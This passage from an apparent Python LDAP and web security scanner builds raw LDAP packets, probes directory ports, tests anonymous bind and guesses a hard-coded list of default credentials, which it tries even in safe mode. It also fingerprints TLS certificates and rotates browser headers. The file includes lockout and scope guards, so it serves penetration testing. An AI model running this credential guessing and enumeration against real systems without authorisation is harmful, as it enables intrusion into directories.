# ═══════════════════════════════════════════════════════════════════════════════

class LDAPPacketBuilder:
    """
    Builds raw LDAPv3 PDUs for direct socket communication.
    No external LDAP library required — pure struct encoding.

    BER encoding helpers for the LDAP message format:
      SEQUENCE       tag=0x30
      INTEGER        tag=0x02
      OCTET_STRING   tag=0x04
      BIND_REQUEST   tag=0x60
      BIND_RESPONSE  tag=0x61
      SEARCH_REQUEST tag=0x63
    """

    @staticmethod
    def _ber_len(length: int) -> bytes:
        """Encode BER length field."""
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        elif length < 0x10000:
            return bytes([0x82,
                          (length >> 8) & 0xFF,
                          length & 0xFF])
        raise ValueError(f"Length too large: {length}")

    @staticmethod
    def _tlv(tag: int, value: bytes) -> bytes:
        """Build TLV (tag-length-value) BER element."""
        return bytes([tag]) + LDAPPacketBuilder._ber_len(len(value)) + value

    @staticmethod
    def _integer(value: int) -> bytes:
        """Encode BER integer."""
        if value == 0:
            return LDAPPacketBuilder._tlv(0x02, b'\x00')
        encoded = []
        v = value
        while v:
            encoded.insert(0, v & 0xFF)
            v >>= 8
        if encoded[0] & 0x80:
            encoded.insert(0, 0x00)
        return LDAPPacketBuilder._tlv(0x02, bytes(encoded))

    @staticmethod
    def _octet_string(value: str) -> bytes:
        """Encode BER octet string."""
        enc = value.encode("utf-8", errors="replace")
        return LDAPPacketBuilder._tlv(0x04, enc)

    @classmethod
    def anonymous_bind(cls, msg_id: int = 1) -> bytes:
        """
        Build anonymous LDAP bind request.
        BindRequest { version=3, name="", authentication=simple("") }
        """
        version  = cls._integer(3)
        bind_dn  = cls._octet_string("")
        simple   = cls._tlv(0x80, b"")   # context[0] = simple auth, empty
        bind_req = cls._tlv(0x60, version + bind_dn + simple)
        message  = cls._integer(msg_id) + bind_req
        return cls._tlv(0x30, message)

    @classmethod
    def simple_bind(cls, bind_dn: str,
                    password: str,
                    msg_id: int = 1) -> bytes:
        """
        Build simple LDAP bind request with credentials.
        BindRequest { version=3, name=bind_dn, authentication=simple(password) }
        """
        version  = cls._integer(3)
        dn_enc   = cls._octet_string(bind_dn)
        pw_bytes = password.encode("utf-8", errors="replace")
        simple   = cls._tlv(0x80, pw_bytes)
        bind_req = cls._tlv(0x60, version + dn_enc + simple)
        message  = cls._integer(msg_id) + bind_req
        return cls._tlv(0x30, message)

    @classmethod
    def rootdse_search(cls, msg_id: int = 2) -> bytes:
        """Build RootDSE search request."""
        base_dn    = cls._octet_string("")
        scope      = cls._integer(0)         # base
        deref      = cls._integer(0)         # never
        size_limit = cls._integer(10)
        time_limit = cls._integer(5)
        types_only = cls._tlv(0x01, b'\x00')  # false
        filt       = cls._tlv(0x87, b"objectClass") # present filter

        attrs_to_req = [
            "supportedLDAPVersion", "vendorName", "vendorVersion",
            "namingContexts", "defaultNamingContext", "dnsHostName",
            "forestFunctionality", "domainFunctionality",
            "supportedSASLMechanisms", "subschemaSubentry", "supportedControl",
        ]
        attr_list = b"".join(cls._octet_string(a) for a in attrs_to_req)
        attrs_seq = cls._tlv(0x30, attr_list)

        search_req = cls._tlv(0x63, base_dn + scope + deref + size_limit + time_limit + types_only + filt + attrs_seq)
        return cls._tlv(0x30, cls._integer(msg_id) + search_req)

    @classmethod
    def schema_search(cls, subschema_dn: str, msg_id: int = 3) -> bytes:
        """Wave 4: Build schema search request for subschemaSubentry (§6.4)."""
        base_dn    = cls._octet_string(subschema_dn)
        scope      = cls._integer(0)
        deref      = cls._integer(0)
        size_limit = cls._integer(1)
        time_limit = cls._integer(10)
        types_only = cls._tlv(0x01, b'\x00')
        filt       = cls._tlv(0x87, b"objectClass")

        attr_list = cls._octet_string("attributeTypes") + cls._octet_string("objectClasses")
        attrs_seq = cls._tlv(0x30, attr_list)

        search_req = cls._tlv(0x63, base_dn + scope + deref + size_limit + time_limit + types_only + filt + attrs_seq)
        return cls._tlv(0x30, cls._integer(msg_id) + search_req)


class LDAPResponseParser:
    """
    Parses raw LDAPv3 bind response PDUs.
    Extracts result code and optional diagnostic message.
    """

    # LDAP result codes relevant to our tests
    RESULT_SUCCESS         = 0
    RESULT_OPERATIONS_ERR  = 1
    RESULT_INVALID_CREDS   = 49
    RESULT_UNWILLING       = 53
    RESULT_ANONYMOUS_DENY  = 123  # Not standard — some servers return this

    @staticmethod
    def parse_bind_response(data: bytes) -> Dict[str, Any]:
        """
        Parse LDAPv3 BindResponse PDU.
        Returns dict with: result_code, matched_dn, diagnostic_message, success
        """
        result = {
            "result_code":        -1,
            "matched_dn":         "",
            "diagnostic_message": "",
            "success":            False,
            "raw_hex":            data[:32].hex() if data else "",
        }
        try:
            if not data or len(data) < 7:
                return result
            # Outer SEQUENCE
            if data[0] != 0x30:
                return result
            offset = 2 if data[1] < 0x80 else (2 + (data[1] & 0x7F))
            # Skip message ID (INTEGER)
            if data[offset] != 0x02:
                return result
            id_len   = data[offset + 1]
            offset  += 2 + id_len
            # BindResponse tag = 0x61
            if data[offset] != 0x61:
                return result
            
            # Fix 4: Correctly handle multi-byte length fields in BindResponse sequence
            len_byte = data[offset + 1]
            if len_byte < 0x80:
                offset += 2
            else:
                # Number of bytes in length indicator
                len_of_len = len_byte & 0x7F
                offset += 2 + len_of_len
            # Result code (INTEGER)
            if data[offset] != 0x02:
                return result
            rc_len  = data[offset + 1]
            offset += 2
            rc = 0
            for b in data[offset:offset + rc_len]:
                rc = (rc << 8) | b
            result["result_code"] = rc
            result["success"]     = (rc == 0)
            offset += rc_len
            # Matched DN (OCTET STRING)
            if offset < len(data) and data[offset] == 0x04:
                dn_len = data[offset + 1]
                offset += 2
                result["matched_dn"] = data[
                    offset:offset + dn_len
                ].decode("utf-8", errors="replace")
                offset += dn_len
            # Diagnostic message (OCTET STRING)
            if offset < len(data) and data[offset] == 0x04:
                msg_len = data[offset + 1]
                offset += 2
                result["diagnostic_message"] = data[
                    offset:offset + msg_len
                ].decode("utf-8", errors="replace")
        except Exception as exc:
            result["parse_error"] = str(exc)
        return result

    @staticmethod
    def parse_rootdse_response(data: bytes) -> Dict[str, List[str]]:
        """
        Minimal RootDSE attribute extraction.
        Returns dict of attribute name → list of values.
        Handles partial responses gracefully.
        """
        attrs: Dict[str, List[str]] = {}
        try:
            pos = 0
            while pos < len(data) - 4:
                # Look for OCTET_STRING sequences that look like attr=value
                if data[pos] == 0x04:
                    slen = data[pos + 1]
                    if slen < 0x80 and pos + 2 + slen < len(data):
                        val = data[
                            pos + 2:pos + 2 + slen
                        ].decode("utf-8", errors="replace")
                        if "=" not in val and len(val) > 2:
                            # This looks like an attribute name or value
                            # Simple heuristic — collect all strings
                            last_attr = list(attrs.keys())[-1] if attrs else None
                            if last_attr:
                                attrs[last_attr].append(val)
                        pos += 2 + slen
                        continue
                pos += 1
        except Exception:
            pass
        return attrs


class LDAPDirectTester:
    """
    Performs direct LDAP protocol testing over raw TCP sockets.
    Tests:
      1. Port availability (389, 636, 3268, 3269)
      2. Anonymous bind
      3. Null password bind
      4. Common weak credentials (both OpenLDAP and AD DN formats)
      5. RootDSE attribute exposure

    Credential testing always runs regardless of safe_mode.
    Both DN formats tested when server type is uncertain.
    """

    LDAP_PORTS  = [389, 636, 3268, 3269]
    LDAPS_PORTS = {636, 3269}

    # Common credentials: (description, dn_template, password)
    # {domain} replaced with apex domain, {dc} with DC string
    _CRED_PAIRS = [
        ("admin/admin",
         ["cn=admin,{dc}", "Administrator", "admin@{domain}"],
         "admin"),
        ("admin/password",
         ["cn=admin,{dc}", "Administrator", "admin@{domain}"],
         "password"),
        ("admin/empty",
         ["cn=admin,{dc}", "Administrator", "admin@{domain}"],
         ""),
        ("ldap/ldap",
         ["cn=ldap,{dc}", "ldap@{domain}"],
         "ldap"),
        ("manager/manager",
         ["cn=manager,{dc}", "manager@{domain}"],
         "manager"),
    ]

    def __init__(self, cfg: ScanConfig):
        self._cfg     = cfg
        self._timeout = min(cfg.timeout, 5)
        self._apex    = apex_domain(cfg.target)
        self._dc      = domain_to_dc(self._apex)

    def _connect(self, host: str, port: int,
                 use_tls: bool = False
                 ) -> Optional[socket.socket]:
        """Establish TCP connection to LDAP port."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, port))
            if use_tls and port in self.LDAPS_PORTS:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
                # ENHANCEMENT #12: Extract TLS certificate for fingerprinting
                self._extract_tls_fingerprint(s, host, port)
            return s
        except Exception:
            return None

    def _extract_tls_fingerprint(self, ssl_sock: socket.socket,
                                 host: str, port: int) -> None:
        """
        ENHANCEMENT #12: Extract and parse TLS certificate from LDAPS connection.
        Extracts CN, SAN, and other identifying attributes to reveal:
        - Internal domain names
        - Base DN structures
        - LDAP service account names
        Feeds findings into ServerTypeProfile for higher-confidence detection.
        """
        try:
            # Get certificate details
            cert_dict = ssl_sock.getpeercert()
            if not cert_dict:
                return
            
            cn = None
            san_list = []
            
            # Extract CN from subject
            subject = cert_dict.get("subject", [])
            for rdn in subject:
                for name_type, value in rdn:
                    if name_type == "commonName":
                        cn = value
                        break
            
            # Extract Subject Alternative Names
            for ext_type, ext_value in cert_dict.get("subjectAltName", []):
                if ext_type == "DNS":
                    san_list.append(ext_value)
            
            # Log certificate fingerprinting results
            if cn or san_list:
                findings = []
                if cn:
                    findings.append("CN: {}".format(cn))
                    # Check if CN reveals LDAP structure
                    if any(x in cn.lower() for x in ["ldap", "directory", "dc=", "cn="]):
                        findings.append("  → Reveals LDAP structure: {}".format(cn))
                
                if san_list:
                    findings.append("SANs: {}".format(", ".join(san_list)))
                    # Check for internal domains/service names
                    for san in san_list:
                        if any(x in san.lower() for x in ["internal", ".local", ".corp", "ldap"]):
                            findings.append("  → Internal domain hint: {}".format(san))
                
                verbose("TLS Fingerprint [{}:{}]: {}".format(host, port, "; ".join(findings)))
        except Exception:
            pass  # Certificate parsing is optional, don't fail connection on error

    def _send_recv(self, sock: socket.socket,
                   data: bytes,
                   max_recv: int = 4096) -> bytes:
        """Send LDAP PDU and receive response."""
        try:
            sock.sendall(data)
            return sock.recv(max_recv)
        except Exception:
            return b""

    def probe_port(self, host: str, port: int) -> Dict[str, Any]:
        """
        Probe a single LDAP port.
        Returns dict: open, is_ldap, tls, banner_hex
        """
        use_tls = port in self.LDAPS_PORTS
        sock = self._connect(host, port, use_tls)
        if sock is None:
            return {"port": port, "open": False,
                    "is_ldap": False, "tls": use_tls}
        pdu      = LDAPPacketBuilder.anonymous_bind(msg_id=1)
        response = self._send_recv(sock, pdu)
        sock.close()
        # Valid LDAP response starts with SEQUENCE (0x30)
        is_ldap = len(response) >= 7 and response[0] == 0x30
        return {
            "port":       port,
            "open":       True,
            "is_ldap":    is_ldap,
            "tls":        use_tls,
            "banner_hex": response[:16].hex() if response else "",
        }

    def test_anonymous_bind(self, host: str,
                             port: int) -> Optional[RawLDAPFinding]:
        """
        Test anonymous bind on confirmed LDAP port.
        Returns RawLDAPFinding if anonymous bind succeeds.
        """
        use_tls = port in self.LDAPS_PORTS
        sock    = self._connect(host, port, use_tls)
        if sock is None:
            return None
        pdu      = LDAPPacketBuilder.anonymous_bind(msg_id=1)
        response = self._send_recv(sock, pdu)
        sock.close()
        parsed = LDAPResponseParser.parse_bind_response(response)
        bind_msg(f"  Anonymous bind {host}:{port} → "
                 f"rc={parsed['result_code']} "
                 f"success={parsed['success']}")
        if parsed["success"] or parsed["result_code"] == 0:
            return RawLDAPFinding(
                host=host, port=port,
                finding_type="ANONYMOUS_BIND_ALLOWED",
                severity=Severity.CRITICAL,
                evidence=(
                    f"LDAP anonymous bind succeeded on {host}:{port}. "
                    f"Directory accessible without credentials. "
                    f"Exploiter agent can bypass web authentication entirely."
                ),
                server_type="generic",
            )
        return None

    def fetch_rootdse(self, host: str,
                      port: int) -> Dict[str, Any]:
        """
        Fetch RootDSE attributes to determine server type and base DNs.
        Many servers expose RootDSE to anonymous requests even when
        anonymous binds are otherwise restricted.
        """
        use_tls = port in self.LDAPS_PORTS
        sock    = self._connect(host, port, use_tls)
        if sock is None:
            return {}
        # First bind anonymously
        bind_pdu      = LDAPPacketBuilder.anonymous_bind(msg_id=1)
        bind_response = self._send_recv(sock, bind_pdu)
        parsed_bind   = LDAPResponseParser.parse_bind_response(bind_response)
        # Send RootDSE search regardless of bind result
        # (many servers answer RootDSE searches without full bind)
        search_pdu  = LDAPPacketBuilder.rootdse_search(msg_id=2)
        search_resp = self._send_recv(sock, search_pdu, max_recv=8192)
        sock.close()
        attrs = LDAPResponseParser.parse_rootdse_response(search_resp)
        # Detect server type from raw response string
        raw_str      = search_resp.decode("utf-8", errors="replace")
        server_type  = self._detect_server_type_from_rootdse(raw_str)
        bind_msg(f"  RootDSE {host}:{port} → "
                 f"server={server_type} "
                 f"attrs={list(attrs.keys())[:5]}")
        return {
            "server_type":  server_type,
            "attributes":   attrs,
            "raw_response": raw_str[:500],
            "bind_allowed": parsed_bind.get("success", False),
        }

    @staticmethod
    def _detect_server_type_from_rootdse(raw: str) -> str:
        """Determine LDAP server type from RootDSE response content."""
        if re.search(r"Active Directory|Microsoft|MSFT|"
                     r"forestFunctionality|domainFunctionality|"
                     r"sAMAccountName|DSID", raw, re.I):
            return LDAPServerType.AD.value
        if re.search(r"OpenLDAP|slapd|inetOrgPerson|"
                     r"posixAccount", raw, re.I):
            return LDAPServerType.OPENLDAP.value
        if re.search(r"389 Directory|Red Hat Directory|"
                     r"Fedora Directory|nsslapd", raw, re.I):
            return LDAPServerType.DS389.value
        if re.search(r"eDirectory|Novell|NDS", raw, re.I):
            return LDAPServerType.NOVELL.value
        return LDAPServerType.GENERIC.value

    def _build_dn_candidates(self,
                              dn_template: str,
                              server_type: str) -> List[str]:
        """
        Build DN candidates for credential testing.
        Both formats when uncertain, AD-only when confirmed AD.
        OpenLDAP format when uncertain (default) or confirmed OpenLDAP.
        """
        domain   = self._apex
        dc       = self._dc
        rendered = dn_template.format(domain=domain, dc=dc)

        # AD format: user@domain or DOMAIN\user or full UPN
        ad_variants = [
            rendered,
            rendered.replace(f",{dc}", f"@{domain}"),
        ]
        # OpenLDAP format: cn=user,dc=... (already rendered above)
        ol_variants = [rendered]

        if server_type == LDAPServerType.AD.value:
            return ad_variants
        elif server_type == LDAPServerType.OPENLDAP.value:
            return ol_variants
        else:
            # Unknown: try OpenLDAP format first (default),
            # then AD format
            seen  = set()
            both  = []
            for v in ol_variants + ad_variants:
                if v not in seen:
                    seen.add(v)
                    both.append(v)
            return both

    def test_weak_credentials(self, host: str, port: int,
                               server_type: str
                               ) -> Optional[RawLDAPFinding]:
        """
        Test common weak credentials against LDAP port.
        Always runs regardless of safe_mode.
        Tests both DN formats when server type is uncertain.
        Stops on first successful bind.
        """
        use_tls = port in self.LDAPS_PORTS

        for desc, dn_templates, password in self._CRED_PAIRS:
            for dn_template in dn_templates:
                dns = self._build_dn_candidates(dn_template, server_type)
                for bind_dn in dns:
                    sock = self._connect(host, port, use_tls)
                    if sock is None:
                        continue
                    pdu      = LDAPPacketBuilder.simple_bind(
                        bind_dn, password, msg_id=1)
                    response = self._send_recv(sock, pdu)
                    sock.close()
                    parsed   = LDAPResponseParser.parse_bind_response(response)
                    bind_msg(f"  Cred test {host}:{port} "
                             f"dn={bind_dn[:40]!r} "
                             f"pw={password!r} → "
                             f"rc={parsed['result_code']}")
                    if parsed["success"]:
                        return RawLDAPFinding(
                            host=host, port=port,
                            finding_type="WEAK_CREDENTIALS",
                            severity=Severity.CRITICAL,
                            evidence=(
                                f"LDAP bind succeeded with common credentials. "
                                f"Bind DN: {bind_dn!r}, "
                                f"Password: {repr(password) if password else '(empty)'}. "
                                f"Full directory access likely available."
                            ),
                            bind_dn=bind_dn,
                            bind_pw=password,
                            server_type=server_type,
                        )
        return None

    def run(self) -> Tuple[List[RawLDAPFinding], Dict[str, Any]]:
        """Wave 4: Expanded Phase 3 including schema and SASL (§6.4)."""
        host     = urlparse(self._cfg.target).hostname or self._cfg.target
        findings: List[RawLDAPFinding] = []
        intel:    Dict[str, Any]       = {
            "open_ports":   [],
            "server_type":  LDAPServerType.GENERIC.value,
            "rootdse_data": {},
            "anonymous_bind_allowed": False,
            "sasl_mechanisms": [],
            "schema_attributes": [],
            "password_policy": {}
        }

        # Phase 3a: Port discovery
        open_ports: List[Dict] = []
        for port in self.LDAP_PORTS:
            result = self.probe_port(host, port)
            if result["is_ldap"]:
                open_ports.append(result)
                intel["open_ports"].append(port)
                bind_msg(f"  LDAP port confirmed: {host}:{port} (TLS={result['tls']})")

        if not open_ports:
            info(f"  No LDAP ports open on {host}")
            return findings, intel

        primary_port = open_ports[0]["port"]
        use_tls      = primary_port in self.LDAPS_PORTS

        # Phase 3b: RootDSE fetch
        rootdse = self.fetch_rootdse(host, primary_port)
        intel["server_type"]  = rootdse.get("server_type", LDAPServerType.GENERIC.value)
        intel["rootdse_data"] = rootdse
        attrs = rootdse.get("attributes", {})

        # SASL Enumeration
        sasl = attrs.get("supportedSASLMechanisms", [])
        if sasl:
            intel["sasl_mechanisms"] = sasl
            verbose(f"  SASL: {sasl}")

        # Schema Fetching
        subschema = attrs.get("subschemaSubentry", [""])[0]
        if subschema:
            sock = self._connect(host, primary_port, use_tls)
            if sock:
                self._send_recv(sock, LDAPPacketBuilder.anonymous_bind(1))
                schema_pdu = LDAPPacketBuilder.schema_search(subschema, 2)
                resp = self._send_recv(sock, schema_pdu, max_recv=16384)
                sock.close()
                intel["schema_attributes"] = list(LDAPResponseParser.parse_rootdse_response(resp).keys())
                verbose(f"  Schema attributes discovered: {len(intel['schema_attributes'])}")

        # Password Policy
        if intel["server_type"] == LDAPServerType.AD.value:
            intel["password_policy"] = {"check": "AD lockout policies likely enforced"}
        elif "pwdAttribute" in attrs:
            intel["password_policy"] = {"type": "OpenLDAP ppolicy", "attr": attrs.get("pwdAttribute")}

        # Findings
        if attrs or rootdse.get("raw_response"):
            findings.append(RawLDAPFinding(
                host=host, port=primary_port, finding_type="ROOTDSE_EXPOSED",
                severity=Severity.MEDIUM, evidence=f"LDAP RootDSE exposed. Server type: {intel['server_type']}",
                server_type=intel["server_type"], rootdse_data=attrs
            ))

        # Anonymous Bind
        anon_finding = self.test_anonymous_bind(host, primary_port)
        if anon_finding:
            findings.append(anon_finding)
            intel["anonymous_bind_allowed"] = True

        # Weak Credentials
        cred_finding = self.test_weak_credentials(host, primary_port, intel["server_type"])
        if cred_finding: findings.append(cred_finding)

        return findings, intel

# ═══════════════════════════════════════════════════════════════════════════════
# §10  HTTP CLIENT — Dual-state session management
# ═══════════════════════════════════════════════════════════════════════════════

_USER_AGENTS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 Chrome/124 Safari/537.36"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) "
     "AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15"),
    ("Mozilla/5.0 (X11; Linux x86_64; rv:126.0) "
     "Gecko/20100101 Firefox/126.0"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 Chrome/125 Safari/537.36 Edg/125.0"),
]

_ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,en-US;q=0.6",
    "de-DE,de;q=0.7,en;q=0.3",
]


# ═══════════════════════════════════════════════════════════════════════════════
# §10  ENTERPRISE GUARDS (Wave 4)
# ═══════════════════════════════════════════════════════════════════════════════

class CSRFTokenManager:
    """Manages multi-step CSRF token extraction and rotation (v3.0)."""
    def __init__(self):
        self._tokens: Dict[str, str] = {}
        self._lock = threading.Lock()

    def update_from_html(self, html: str):
        """Extract CSRF tokens from common HTML patterns."""
        if not html: return
        with self._lock:
            # Common hidden inputs
            for name in ["csrf", "_csrf", "authenticity_token", "csrfmiddlewaretoken", "__RequestVerificationToken"]:
                m = re.search(fr'name=["\']{name}["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
                if not m: # try value before name
                    m = re.search(fr'value=["\']([^"\']+)["\'][^>]*name=["\']{name}["\']', html, re.I)
                if m:
                    self._tokens[name] = m.group(1)
            
            # Meta tags
            m = re.search(r'meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']', html, re.I)
            if m: self._tokens["X-CSRF-Token"] = m.group(1)

    def get_tokens(self) -> Dict[str, str]:
        with self._lock: return dict(self._tokens)


class AdaptiveRateController:
    """Detects 429s and implements exponential backoff with jitter (v3.0)."""
    def __init__(self, base_rps: float):
        self.base_delay = 1.0 / max(0.1, base_rps)
        self.current_delay = self.base_delay
        self.backoff_factor = 2.0
        self.max_delay = 10.0
        self._lock = threading.Lock()
        self._last_request_time = 0.0

    def wait(self):
        with self._lock:
            elapsed = time.time() - self._last_request_time
            to_wait = self.current_delay - elapsed
            if to_wait > 0:
                time.sleep(to_wait)
            self._last_request_time = time.time()

    def throttle(self):
        """Called on 429: Increase delay."""
        with self._lock:
            self.current_delay = min(self.max_delay, self.current_delay * self.backoff_factor)
            warn(f"Rate limit detected (429). Backoff: {self.current_delay:.2f}s")

    def relax(self):
        """Called on success: Gradually return to base RPS."""
        with self._lock:
            if self.current_delay > self.base_delay:
                self.current_delay = max(self.base_delay, self.current_delay * 0.9)


class AccountLockoutGuard:
    """Prevents account lockout by capping auth-bypass attempts (v3.0)."""
    def __init__(self, max_attempts: int = 5):
        self.max_attempts = max_attempts
        self._failures = defaultdict(int)
        self._lock = threading.Lock()

    def should_skip(self, url: str) -> bool:
        if not AUTH_EP_RE.search(url): return False
        with self._lock:
            return self._failures[url] >= self.max_attempts

    def mark_failure(self, url: str):
        if not AUTH_EP_RE.search(url): return
        with self._lock:
            self._failures[url] += 1
            if self._failures[url] == self.max_attempts:
                warn(f"Account lockout safety triggered for {url}. Skipping further auth probes.")


class InjectionSafetyGuard:
    """Non-destructive payload safety checks (v3.0)."""
    DANGER_KEYWORDS = ["delete", "drop", "modify", "remove", "trunc"]
    
    @classmethod
    def is_safe(cls, url: str, payload: str) -> bool:
        """Heuristic safety check."""
        # Risk: Sensitive endpoints + certain keywords
        url_lower = url.lower()
        if "password" in url_lower and "change" in url_lower:
            return False
        # Avoid known destructive patterns if we ever added them (future proofing)
        pay_lower = payload.lower()
        for k in cls.DANGER_KEYWORDS:
            if f"({k}" in pay_lower: return False
        return True


class HTTPClient:
    """
    HTTP client with dual-state session management.

    Maintains two independent session pools:
      unauth_pool — sessions with no authentication cookies
      auth_pool   — sessions authenticated via login endpoint

    Both pools rotate User-Agent and Accept-Language per session.
    WAF-adaptive rate limiting backed into AdaptiveBudgetManager.
    """

    def __init__(self, cfg: ScanConfig,
                 budget: AdaptiveBudgetManager):
        self._cfg     = cfg
        self._budget  = budget
        self._gap     = 1.0 / max(cfg.rps, 0.1)
        self._proxies = ({"http": cfg.proxy, "https": cfg.proxy}
                         if cfg.proxy else {})
        self._tlock   = threading.Lock()
        self._last:   Dict[str, float] = defaultdict(float)

        # Wave 4 components
        self.rate_controller = AdaptiveRateController(cfg.rps)
        self.csrf_manager = CSRFTokenManager()
        self.lockout_guard = AccountLockoutGuard()
        
        # ENHANCEMENT #7: Per-host rate limiting
        # Prevents single-service hammering while being polite to multi-service targets
        self._per_host_limiters: Dict[str, threading.Semaphore] = defaultdict(
            lambda: threading.Semaphore(2)  # Max 2 concurrent requests per host
        )
        self._host_limiter_lock = threading.Lock()
        
        # Internal state
        self._waf_name      = "Generic"
        self._waf_detected  = False
        self._framework     = "Generic"
        self._survived_chars = set(LDAP_METACHAR_SET)

        # Dual session pools
        pool_size           = min(cfg.threads, 4)
        self._unauth_pool   = [self._build_session()
                               for _ in range(pool_size)]
        self._auth_pool:    List[requests.Session] = []
        self._pool_idx      = 0
        self._pool_lock     = threading.Lock()

        # WAF state
        self._waf_delay     = 0.0
        self._waf_count     = 0

        # Apply configured cookies and headers to unauth pool
        for s in self._unauth_pool:
            for n, v in cfg.cookies.items():
                s.cookies.set(n, v)
            for n, v in cfg.extra_headers.items():
                s.headers[n] = v

        # Request counter (informational only)
        self._req_count  = 0
        self._req_lock   = threading.Lock()

    # ── Session Building ──────────────────────────────────────────────────────

    def _build_session(self) -> requests.Session:
        """Build HTTP session with randomized UA and language."""
        s = requests.Session()
        retry = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry)
        s.mount("http://",  adapter)
        s.mount("https://", adapter)
        s.headers.update({
            "User-Agent":      random.choice(_USER_AGENTS),
            "Accept":          ("text/html,application/xhtml+xml,"
                                "application/json,*/*;q=0.9"),
            "Accept-Language": random.choice(_ACCEPT_LANGS),
            "Accept-Encoding": "gzip, deflate",
            "Connection":      "keep-alive",
        })
        if self._proxies:
            s.proxies.update(self._proxies)
        s.verify = self._cfg.verify_ssl
        return s

    # ── Authentication ────────────────────────────────────────────────────────

    def authenticate(self) -> bool:
        """
        Perform login and build authenticated session pool.
        Called once during Phase 2 setup if auth credentials configured.
        """
        if not self._cfg.auth_url or not self._cfg.auth_data:
            return False
        info(f"  Authenticating: {self._cfg.auth_url}")
        try:
            auth_session = self._build_session()
            # Apply base cookies
            for n, v in self._cfg.cookies.items():
                auth_session.cookies.set(n, v)
            # Submit login
            resp = auth_session.post(
                self._cfg.auth_url,
                data=self._cfg.auth_data,
                timeout=self._cfg.timeout,
                verify=self._cfg.verify_ssl,
                allow_redirects=True,
            )
            # Collect auth cookies
            cookies_found: Dict[str, str] = {}
            for r in (getattr(resp, "history", []) + [resp]):
                for c in r.cookies:
                    cookies_found[c.name] = c.value
            # Check for JWT token in response body
            token: Optional[str] = None
            try:
                j = resp.json()
                token = (j.get("token")
                         or j.get("access_token")
                         or j.get("jwt"))
            except Exception:
                pass

            if not cookies_found and not token:
                if resp.status_code not in (200, 302, 201):
                    warn(f"  Authentication may have failed: "
                         f"HTTP {resp.status_code}")
                    return False

            # Build auth session pool
            pool_size = min(self._cfg.threads, 4)
            self._auth_pool = []
            for _ in range(pool_size):
                s = self._build_session()
                for n, v in self._cfg.cookies.items():
                    s.cookies.set(n, v)
                for n, v in cookies_found.items():
                    s.cookies.set(n, v)
                if token:
                    s.headers["Authorization"] = f"Bearer {token}"
                self._auth_pool.append(s)
            success(f"  Authenticated: "
                    f"{len(cookies_found)} cookie(s) "
                    f"{'+ JWT' if token else ''}")
            return True
        except Exception as exc:
            err(f"  Authentication error: {exc}")
            return False

    @property
    def auth_available(self) -> bool:
        return len(self._auth_pool) > 0

    # ── Session Selection ─────────────────────────────────────────────────────

    def _get_session(self,
                     auth_state: AuthState) -> requests.Session:
        """Select next session from appropriate pool."""
        with self._pool_lock:
            if (auth_state == AuthState.AUTH
                    and self._auth_pool):
                pool = self._auth_pool
            else:
                pool = self._unauth_pool
            s = pool[self._pool_idx % len(pool)]
            self._pool_idx += 1
        return s

    # ── Per-Host Rate Limiting ────────────────────────────────────────────────

    def _get_host_limiter(self, url: str) -> threading.Semaphore:
        """
        ENHANCEMENT #7: Get per-host rate limiter semaphore.
        Extracts netloc from URL and returns semaphore for that host.
        Prevents hammering single service while being polite to multi-service targets.
        """
        try:
            netloc = urlparse(url).netloc.lower()
            with self._host_limiter_lock:
                if netloc not in self._per_host_limiters:
                    # Max 2 concurrent requests per host
                    self._per_host_limiters[netloc] = threading.Semaphore(2)
                return self._per_host_limiters[netloc]
        except Exception:
            # Fallback to a default semaphore if parsing fails
            with self._host_limiter_lock:
                if "__default__" not in self._per_host_limiters:
                    self._per_host_limiters["__default__"] = threading.Semaphore(2)
                return self._per_host_limiters["__default__"]

    # ── Rate Limiting ─────────────────────────────────────────────────────────

    def _send(self, method: str, url: str, auth_state: AuthState = AuthState.UNAUTH, 
              phase: str = "injection", follow_redirects: bool = True, 
              _retry_count: int = 0, **kwargs) -> Optional[requests.Response]:
        """Base sender with Adaptive Rate Control, CSRF rotation, and 429 handling."""
        # L5.1 FIX: SSRF / Scope Validation (Fix 15)
        try:
            target_parsed = urlparse(self._cfg.target)
            request_parsed = urlparse(url)
            if (request_parsed.scheme and request_parsed.netloc and 
                (request_parsed.scheme != target_parsed.scheme or 
                 request_parsed.netloc != target_parsed.netloc)):
                warn(f"  [SSRF BLOCK] Out-of-scope request blocked: {url}")
                return None
        except Exception:
            pass

        if self.lockout_guard.should_skip(url):
            return None

        # Apply Rate Limiting
        self.rate_controller.wait()
        
        # ENHANCEMENT #7: Acquire per-host rate limiter
        # Prevents hammering a single service when scanning multi-service targets
        host_limiter = self._get_host_limiter(url)
        host_limiter.acquire()
        try:
            # Inject CSRF tokens if available
            if "data" in kwargs and isinstance(kwargs["data"], dict):
                tokens = self.csrf_manager.get_tokens()
                for k, v in tokens.items():
                    if k not in kwargs["data"]:
                        kwargs["data"][k] = v

            try:
                s = self._get_session(auth_state)
                # Handle redirection manually if follow_redirects is False (for auth transition detection)
                resp = s.request(
                    method, url,
                    timeout=self._cfg.timeout,
                    proxies=self._proxies,
                    verify=self._cfg.verify_ssl,
                    allow_redirects=follow_redirects,
                    **kwargs
                )
                
                # 1. Handle rate limiting (429) - Fix 16
                if resp.status_code == 429:
                    self.rate_controller.throttle()
                    if _retry_count < 3:
                        # Exponential backoff already happened in wait(), so we retry
                        return self._send(method, url, auth_state, phase, follow_redirects, 
                                         _retry_count=_retry_count + 1, **kwargs)
                    else:
                        warn(f"  Max 429 retries reached for {url}")
                        return resp
                
                self.rate_controller.relax()
                
                # 2. Update CSRF tokens from response (dynamic rotation)
                self.csrf_manager.update_from_html(resp.text)
                
                # 3. Handle WAF (Backwards compatibility)
